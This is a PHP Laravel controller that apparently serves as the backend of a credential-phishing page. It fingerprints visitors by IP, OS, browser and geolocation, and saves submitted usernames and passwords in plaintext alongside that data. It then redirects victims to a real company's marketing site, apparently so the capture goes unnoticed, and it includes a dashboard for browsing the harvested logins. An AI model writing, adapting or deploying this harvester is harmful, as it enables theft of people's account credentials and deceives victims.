<?php

namespace App\Http\Controllers\SocialNetwork;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Models\Mkt;

class MktController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        /**
         * Get the ip address from the user
         */
        function getUserIpAddr(){
            if(!empty($_SERVER['HTTP_CLIENT_IP'])){
                //ip from share internet
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
                //ip pass from proxy
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            }else{
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            return $ip;
        }

        /**
         * Get the operative system
         */
        function getOS() { 
            //global $user_agent;
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            $os_platform  = "Unknown OS Platform";
            $os_array     = array(
                                '/windows nt 10/i'      =>  'Windows 10',
                                '/windows nt 6.3/i'     =>  'Windows 8.1',
                                '/windows nt 6.2/i'     =>  'Windows 8',
                                '/windows nt 6.1/i'     =>  'Windows 7',
                                '/windows nt 6.0/i'     =>  'Windows Vista',
                                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                '/windows nt 5.1/i'     =>  'Windows XP',
                                '/windows xp/i'         =>  'Windows XP',
                                '/windows nt 5.0/i'     =>  'Windows 2000',
                                '/windows me/i'         =>  'Windows ME',
                                '/win98/i'              =>  'Windows 98',
                                '/win95/i'              =>  'Windows 95',
                                '/win16/i'              =>  'Windows 3.11',
                                '/macintosh|mac os x/i' =>  'Mac OS X',
                                '/mac_powerpc/i'        =>  'Mac OS 9',
                                '/linux/i'              =>  'Linux',
                                '/ubuntu/i'             =>  'Ubuntu',
                                '/iphone/i'             =>  'iPhone',
                                '/ipod/i'               =>  'iPod',
                                '/ipad/i'               =>  'iPad',
                                '/android/i'            =>  'Android',
                                '/blackberry/i'         =>  'BlackBerry',
                                '/webos/i'              =>  'Mobile'
                            );
    
            foreach ($os_array as $regex => $value)
                if (preg_match($regex, $user_agent))
                    $os_platform = $value;
    
            return $os_platform;
        }

        /**
         * Get the browser
         */
        function getBrowser() {
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            //global $user_agent;
            $browser        = "Unknown Browser";
            $browser_array = array(
                                    '/msie/i'      => 'Internet Explorer',
                                    '/firefox/i'   => 'Firefox',
                                    '/safari/i'    => 'Safari',
                                    '/chrome/i'    => 'Chrome',
                                    '/edge/i'      => 'Edge',
                                    '/opera/i'     => 'Opera',
                                    '/netscape/i'  => 'Netscape',
                                    '/maxthon/i'   => 'Maxthon',
                                    '/konqueror/i' => 'Konqueror',
                                    '/mobile/i'    => 'Handheld Browser'
                             );
        
            foreach ($browser_array as $regex => $value)
                if (preg_match($regex, $user_agent))
                    $browser = $value;
        
            return $browser;
        }

        /**
         * Get the more details from user
         */
        $PublicIP = getUserIpAddr();
        $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
        $details  = json_decode($details, true);
        $success  = $details['success'];

        if ($success==true) {
            $country  = $details['country'];
            $city     = $details['city'];
            $isp      = $details['isp'];
            $region   = $details['region'];
        }else if($success==false){
            $country  = 'localhost';
            $city     = 'localhost';
            $isp      = 'localhost';
            $region   = 'localhost';
        }
              

        $getIpAddress = getUserIpAddr();
        $getOS = getOS();
        $getBrowser = getBrowser();
        return view('socialNetwork.mkt.index', compact('getIpAddress','getOS','getBrowser', 'country', 'city', 'isp', 'region'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $dataMkt = new Mkt();

        $this->validate($request, [
            'username' => 'required',
            'password' => 'required',
        ]);

        $dataMkt->username = $request->username;
        $dataMkt->password = $request->password;
        $dataMkt->ip = $request->ip;
        $dataMkt->os = $request->os;
        $dataMkt->browser = $request->browser;
        $dataMkt->isp = $request->isp;
        $dataMkt->city = $request->city;
        $dataMkt->region = $request->region;
        $dataMkt->country = $request->country;
        $dataMkt->timezone = $request->timezone;
        
        $dataMkt->save();

        return redirect('https://mkt.diunsa.hn');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function dashboardMkt()
    {
        $dataMkt = Mkt::orderBy('id', 'DESC')->paginate();
        //dd($dataTwitter);
        return view('socialNetwork.mkt.dashboard', compact('dataMkt'));
    }
}
